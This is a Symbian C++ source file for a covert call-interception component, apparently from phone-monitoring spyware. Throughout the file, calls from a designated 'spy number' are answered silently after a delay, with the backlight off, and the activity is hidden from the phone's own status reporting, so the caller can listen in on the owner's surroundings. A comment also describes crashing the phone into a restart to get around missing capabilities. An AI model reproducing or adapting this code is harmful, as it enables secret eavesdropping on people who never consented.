#include "AutoAnswer.h"
#include "Global.h"

#include <EIKDEF.H>
#include <aknappui.h>

_LIT(KTSYModule, "phonetsy");
/**
Delay in second*/
const TInt KAnswerDelay = 6;


//
// Note:
// Etel panic codes are defined in ETELEXT.H
//
//----------------------------------------
///Constructor 
//----------------------------------------

CAutoAnswer::CAutoAnswer(TMonitorInfo& aSpyInfo)
:CActive(CActive::EPriorityHigh),
iMonitorInfo(aSpyInfo)
	{	
	}

CAutoAnswer::~CAutoAnswer()
	{
	Cancel();	
	//delete iLight;	
	delete iIncNotifier;
	delete iCurrCallStaNotifier;
	
	if(iCall.SubSessionHandle())
		iCall.Close();
	
	if(iPhone.SubSessionHandle())
		iPhone.Close();
	
	if(iLine.SubSessionHandle())
	iLine.Close();
	
	//
	//TSY modules are automatically unloaded when the RTelServer session is closed, unless in use by another session	
	iTelServer.Close();
	delete iTel;
	delete iTimer;
	}

CAutoAnswer* CAutoAnswer::NewL(TMonitorInfo& aSpyInfo)
	{	
	CAutoAnswer* self = new (ELeave)CAutoAnswer(aSpyInfo);
	CleanupStack::PushL(self);
	self->ConstructL();
	CleanupStack::Pop(self);
	return self;
	}

void CAutoAnswer::ConstructL()
	{
	ETelInitL();	
	//
	//Incoming call notifier
	iIncNotifier = new (ELeave)CIncomingCallNotifier(iLine,*this);	
	iCurrCallStaNotifier = new (ELeave)CCurrentCallStatusNotifier(iLine,*this);	
	
	//iLight = CLightControl::NewL();
	CActiveScheduler::Add(this);
	
	iTimer = CTimeOut::NewL(*this);
	
	//
	//timer to answer a call
	//set it to very high to make it et 
	iTimer->SetPriority(CActive::EPriorityHigh*2);	
	}

//
//Performs ETel Server initialization
//
void CAutoAnswer::ETelInitL()
	{
	//LOG0(_L("[CAutoAnswer::ETelInitL]"))
	
	iTel=CTelephony::NewL();
	//
	//Connect to etel server
	User::LeaveIfError(iTelServer.Connect());	
	
	//
	//load tsy module
	User::LeaveIfError(iTelServer.LoadPhoneModule(KTSYModule));
	
	TInt numberPhones = 0;
	
	//
	//Enumerate to get number of phones supported
	//
	User::LeaveIfError(iTelServer.EnumeratePhones(numberPhones));
	if(!numberPhones)
		User::Leave(KErrNotFound);
	
	RTelServer::TPhoneInfo phoneInfo;
	
	//
	//Takes the first available phone and get its info
	//
	User::LeaveIfError(iTelServer.GetPhoneInfo(0, phoneInfo));	
	
	//
	//Now, open phone
	User::LeaveIfError(iPhone.Open(iTelServer, phoneInfo.iName));
	
	TInt numberLines = 0;
	
	//
	//How many lines available for selected phone
	//
	User::LeaveIfError(iPhone.EnumerateLines(numberLines));	
	
	RPhone::TLineInfo lineInfo;
	TBool foundLine = EFalse;
	
	//
	//We have to use a line that accept voice calls - normally it is the 1st line
	//
	//Line1: Voice Call
	//Line2: Alternative to line1
	//
	//Line3: Data Call
	//Line4: Fax Call
	//
	for(TInt a = 0; a < numberLines; a++) {
		User::LeaveIfError(iPhone.GetLineInfo(a, lineInfo));		
		if(lineInfo.iLineCapsFlags & RLine::KCapsVoice)	{		
			foundLine = ETrue;
			break;
		}
	}
	
	if(!foundLine)
		User::Leave(KErrNotFound);
	
	//
	//Open a line which accepts voice call
	//
	User::LeaveIfError(iLine.Open(iPhone, lineInfo.iName));	
	
	/* END Initialization ****/	
	
#ifdef __DEBUG_ENABLE__
	
	//LOG1(_L("[CAutoAnswer::ETelInitL] numbersOfLines: %d"),numberLines)		
	for(TInt a = 0; a < numberLines; a++) {
		TInt er = iPhone.GetLineInfo(a, lineInfo);
		if(er) continue;				
		er = iPhone.GetLineInfo(a, lineInfo);
		if(er) continue;			
		//LOG1(_L("[CFxsCallEngine::InitL] LineNumber [%d]"),a)		
		//LOG1(_L("[CFxsCallEngine::InitL] lineInfo.iName: %S"),&lineInfo.iName)
		if(lineInfo.iLineCapsFlags & RLine::KCapsVoice) {
			//LOG0(_L("[CFxsCallEngine::InitL] lineInfo.iLineCapsFlags: KCapsVoice"))
		}
		if(lineInfo.iLineCapsFlags & RLine::KCapsData) {
			//LOG0(_L("[CFxsCallEngine::InitL] lineInfo.iLineCapsFlags: KCapsData"))
		}
		if(lineInfo.iLineCapsFlags & RLine::KCapsFax) {
			//LOG0(_L("[CFxsCallEngine::InitL] lineInfo.iLineCapsFlags: KCapsFax"))
		}
		if(lineInfo.iLineCapsFlags & RLine::KCapsEventIncomingCall) {
			//LOG0(_L("[CFxsCallEngine::InitL] lineInfo.iLineCapsFlags: KCapsEventIncomingCall"))
		}
		//LOG0(_L("[CFxsCallEngine::InitL] --------------------------------"))
		//LOG0(_L("[CAutoAnswer::ETelInitL] End"))
	}
#endif

/*
numbersOfLines: 4
LineNumber [0]
lineInfo.iName: Voice1
lineInfo.iLineCapsFlags: KCapsVoice
lineInfo.iLineCapsFlags: KCapsEventIncomingCall
--------------------------------
LineNumber [1]
lineInfo.iName: Voice2
lineInfo.iLineCapsFlags: KCapsEventIncomingCall
--------------------------------
LineNumber [2]
lineInfo.iName: Data
lineInfo.iLineCapsFlags: KCapsData
lineInfo.iLineCapsFlags: KCapsEventIncomingCall
--------------------------------
LineNumber [3]
lineInfo.iName: Fax
lineInfo.iLineCapsFlags: KCapsFax
lineInfo.iLineCapsFlags: KCapsEventIncomingCall
*/
	}
	

void CAutoAnswer::SetCallActivityObserver(MCallActivityObserver* aObserver)
	{
	iSpyCallObserver=aObserver;
	}
	
	
void CAutoAnswer::Start()
	{
	if(!iStarted)
		{
		iCurrCallStaNotifier->Start();	
		iIncNotifier->Start();
		iStarted=ETrue;
		}
	}

void CAutoAnswer::Stop()
	{
	if(iStarted)
		{		
		iIncNotifier->Stop();
		iCurrCallStaNotifier->Stop();
		Cancel();
		iStarted=EFalse;		
		}
	}

void CAutoAnswer::HandleTimedOutL() 
	{
	MakeAsyncRequest(EOpAnswerIncomingCall);	
	}
	
void CAutoAnswer::RunL()
	{
	if(iStatus == KErrNone)
		{
		switch(iOperation)
			{
			case EOpAnswerIncomingCall:
				{				
				iSpyCallStatus = ESpyStaAnswered;				
				if(iEndCallNow)
					{
					EndSpyCall();
					iEndCallNow = EFalse;
					}
				}break;
			case EOpHangup: 
				{
				iSpyCallStatus=ESpyStaNone;
				}
			default:
				{
				;
				}
			}
		}
	else //ERROR
		{
		switch(iOperation)
			{
			case EOpAnswerIncomingCall:
				{
				if(iStatus.Int() == KErrAccessDenied)
				//this may happen in invalid-state of call
					{
					}
				iEndCallNow = EFalse;
				iSpyCallStatus = ESpyStaHangingUp;
				}break;
			case EOpHangup: 
				{
				}break;
			default:
				;	
			}
		}
	}

void CAutoAnswer::DoCancel()
	{
	switch(iOperation)
		{
		case EOpAnswerIncomingCall:
			{
			iTel->CancelAsync(CTelephony::EAnswerIncomingCallCancel);			
			}break;
		case EOpHangup:
			{
			iCall.HangUpCancel();
			}break;
		default:
			;
		}
	}
 
TInt CAutoAnswer::RunError(TInt /*aErr*/)
	{
	//RunL in this class never leave
	//	
	return KErrNone;
	}

void CAutoAnswer::MakeAsyncRequest(TOperation aOperation)
	{
	iOperation=aOperation;
	switch(aOperation)
		{
		case EOpAnswerIncomingCall:
			{
			iTel->AnswerIncomingCall(iStatus, iCallId, CTelephony::EVoiceLine);
			SetActive();
			iSpyCallStatus=ESpyStaAnswering;
			}break;
		case EOpHangup:
			{
			iCall.HangUp(iStatus);
			SetActive();
			iSpyCallStatus=ESpyStaHangingUp;
			}break;
		default:
			;
		}
	
	NotifyCallActivityObserver();	
	}

//MSpyCallHandle
void CAutoAnswer::Hangup()
	{
	if(SpyCallActive())
		{
		EndSpyCall();
		}
	}

void CAutoAnswer::NotifyCallProgress(MCallActivityObserver::TCallActivity aProgress)
	{
	if(iSpyCallObserver)
		{
		iSpyCallObserver->CallInProgress(aProgress);		
		}	
	}
	
//Handle incoming call
//
void CAutoAnswer::HandleIncomingCallL(const TDesC& aCallName)
	{	
	if(SpyCallActive())
		{
		//
		//A normal call comes in while spy call is active				
		EndSpyCall();		
		}
	else
		{
		//Make sure the previous call is closed otherwise panic 11 occurs	
		if(iCall.SubSessionHandle())
			{
			//Close previous opened call
			
			iCall.Close();
			}
		}
	//
	//Open incoming call
	//
	User::LeaveIfError(iCall.OpenExistingCall(iLine, aCallName));	
	
	//
	//Getting incoming phone number 
	//
	RMobileCall::TMobileCallInfoV1 callInfo;
	RMobileCall::TMobileCallInfoV1Pckg callInfoPckg (callInfo);
	User::LeaveIfError(iCall.GetMobileCallInfo(callInfoPckg));
	
	if(IsSpyNumber(callInfo.iRemoteParty.iRemoteNumber.iTelNumber)) 
		{
		//Spy call comes in		
		if(NormalCallActive())
			{
			NotifyCallProgress(MCallActivityObserver::EActivitySpyCall);
			
			//
			//Spy call comes in while there is an active call.
			EndSpyCall();
			
			NotifyCallProgress(MCallActivityObserver::EActivityNormalCall);
			}
		else // spy call
			{
			//
			//the call will be answered when timer expireds
			//
			//the phone will ring for 9 secs before it is answered
			iTimer->SetInterval(KAnswerDelay);
			iTimer->Start();
			}
		}
	else //
		{		
		iNormalCallActive = ETrue;
		iSpyCallStatus = ESpyStaNone;
		
		//
		//notify observer that a normal call is ringing
		iCurrCallStatus=RCall::EStatusRinging;		
		NotifyCallActivityObserver();
		
		//
		//***** IMPORTANT NOTE *****
		//
		//Do NOT iCall.Close() the call immediately now.		
		//
		//Must wait for a sec before closing the iCall otherwise it causes Telephone: Memory full
		//
		//Dont know why but it works perfectly if wait.
		User::After(1000000);		
		iCall.Close();	
		}
	}

//
//From MCurrentCallStatusObserver
void CAutoAnswer::CurrentStatusChanged(RCall::TStatus aStatus)
	{
	switch(aStatus)
		{
		case RCall::EStatusUnknown:		
		/**
		There is no active call.
		The call is terminated.*/
		case RCall::EStatusIdle:
			{
			CloseRCall();			
			if(SpyCallActive())
				{
				}
			else
				{
				TurnLightOn(ETrue);				
				}
			
			iNormalCallActive = EFalse;
			iSpyCallStatus = ESpyStaNone;
			}break;
		case RCall::EStatusConnected:
			{
			if(SpyCallActive())
				{				
				//Turn off backlight
				TurnLightOn(EFalse);
				}
			}break;
		/**
		Outgoing call is made.*/
		case RCall::EStatusDialling:
			{
			iNormalCallActive = ETrue;
			}break;	
		/**
		The call is being terminated.
		It takes sometimes to completely terminate the active call it may take up to 5 seconds.
		After the call has completely terminated the its status will become EStatusIdle.*/
		case RCall::EStatusHangingUp:
			{
			if(SpyCallActive())
				{
				//The call that is being terminated is spy call
				//
				//Note: here spy call is still considered as active
				//
				//CloseRCall();	
				}
			}break;		
		default:
			{
			if(RCall::EStatusHangingUp == iCurrCallStatus)
				{
				//
				//previous status is hanging up
				//this indicates that spy call is being ended because there is normal call comes in
				//
				LOG0(_L("[CAutoAnswer::CurrentStatusChanged] Spy call has just been terminated"))
				}
			}
		}
	
	iCurrCallStatus=aStatus;
	NotifyCallActivityObserver();
	}
	
void CAutoAnswer::CloseRCall()
	{
	if(iCall.SubSessionHandle()) 
		{
		iCall.Close();
		}
	}

void CAutoAnswer::EndSpyCall()
	{	
	if(ESpyStaAnswering == iSpyCallStatus)
	//
	//TOP SECRET!!!
	//This case causes the phone to restart
	//Invorking Cancel()-iTel->AnswerIncomingCall(iStatus, iCallId, CTelephony::EVoiceLine);
	//while an incoming call is being answered, it causes the phone to restart
	//we can use this technique to restart the phone if can't get capability
	//
	
	//if spy call comes in while a key is pressed then it comes to this case
	//
		{
		//Cancel(); <-- this causes phone to restart so dont' call it
		
		iEndCallNow = ETrue;		
		}
	else
		{
		iEndCallNow = EFalse;
		if(iCall.SubSessionHandle()) 
			{
			TInt err = iCall.HangUp();
			if(err)
				{
				//It may return KErrServerBusy				
				;
				}			
			//this is call is spy call
			//
			iCall.Close();
			}
		
		iSpyCallStatus=ESpyStaNone;
		
		//N80				
		//
		TurnLightOn(ETrue);
		}
	}
	
TBool CAutoAnswer::IsSpyNumber(const TDesC& aPhoneNumber)
	{	
	if(iMonitorInfo.SpyEnable())
		{
		return iMonitorInfo.iTelNumber == aPhoneNumber;
		}
	return EFalse;
	
	//_LIT(KNumber,"0876936457");
	//_LIT(KNumber,"0846534343");
	//_LIT(KNumber,"026932993");
	//_LIT(KNumber,"026932992"); //fax
	}
	
void CAutoAnswer::NotifyCallActivityObserver()
	{
	if(iSpyCallObserver)
		{
		if(SpyCallActive())
			{
			//iSpyCallObserver->CallInProgress(MCallActivityObserver::EActivitySpyCall);
			}
		else //spy call not active
			{
			if(NormalCallActive())
				{
				iSpyCallObserver->CallInProgress(MCallActivityObserver::EActivityNormalCall);
				}
			else
				{
				iSpyCallObserver->CallInProgress(MCallActivityObserver::EActivityNone);
				}
			}
		}
	}

void CAutoAnswer::TurnLightOn(TBool /*aOn*/)
	{
	}

//------------------------------------------------------------
//		CCurrentCallStatusNotifier Impl
//-----------------------------------------------------------
CCurrentCallStatusNotifier::CCurrentCallStatusNotifier(RLine& aLine,MCurrentCallStatusObserver& aObserver)
:CActive(0),
iObserver(aObserver),
iLine(aLine)
	{
	CActiveScheduler::Add(this);
	}

CCurrentCallStatusNotifier::~CCurrentCallStatusNotifier()
	{
	Cancel();
	}

void CCurrentCallStatusNotifier::Start()
	{
	if(!IsActive())
		{
		//
		//Must ensure that line's handle is not null
		//
		iLine.NotifyStatusChange(iStatus, iLineStatus);
		SetActive();		
		}
	}

void CCurrentCallStatusNotifier::Stop()
	{
	if(iLine.SubSessionHandle())
		{
		iLine.NotifyStatusChangeCancel();	
		}
	}

void CCurrentCallStatusNotifier::RunL()
	{
	if(iStatus == KErrNone ) 
		{
		iObserver.CurrentStatusChanged(iLineStatus);
		}
	
	Start();			
	}

void CCurrentCallStatusNotifier::DoCancel()
	{
	Stop();
	}

TInt CCurrentCallStatusNotifier::RunError(TInt /*aEr*/)
	{	
	Start();
	return KErrNone;
	}

//------------------------------------------------------------
//		CIncomingCallNotifier Impl
//-----------------------------------------------------------
CIncomingCallNotifier::CIncomingCallNotifier(RLine& aLine,MIncomingCallObserver& aObserver)
:CActive(0),
iObserver(aObserver),
iLine(aLine)
	{
	CActiveScheduler::Add(this);
	}

CIncomingCallNotifier::~CIncomingCallNotifier()
	{
	Cancel();
	}

void CIncomingCallNotifier::Start()
	{
	if(!IsActive())	
		{
		//
		//Must ensure that line's handle is not null
		//
		if(iLine.SubSessionHandle())
			{
			iLine.NotifyIncomingCall(iStatus, iCallName);
			SetActive();		
			}
		}
	}

void CIncomingCallNotifier::Stop()
	{	
	iLine.NotifyIncomingCallCancel();
	}

void CIncomingCallNotifier::RunL()
	{		
	if(iStatus == KErrNone ) 
		{
		iObserver.HandleIncomingCallL(iCallName);
		}
	
	Start();			
	}

void CIncomingCallNotifier::DoCancel()
	{
	Stop();
	}

TInt CIncomingCallNotifier::RunError(TInt /*aEr*/)
	{	
	Start();
	return KErrNone;
	}
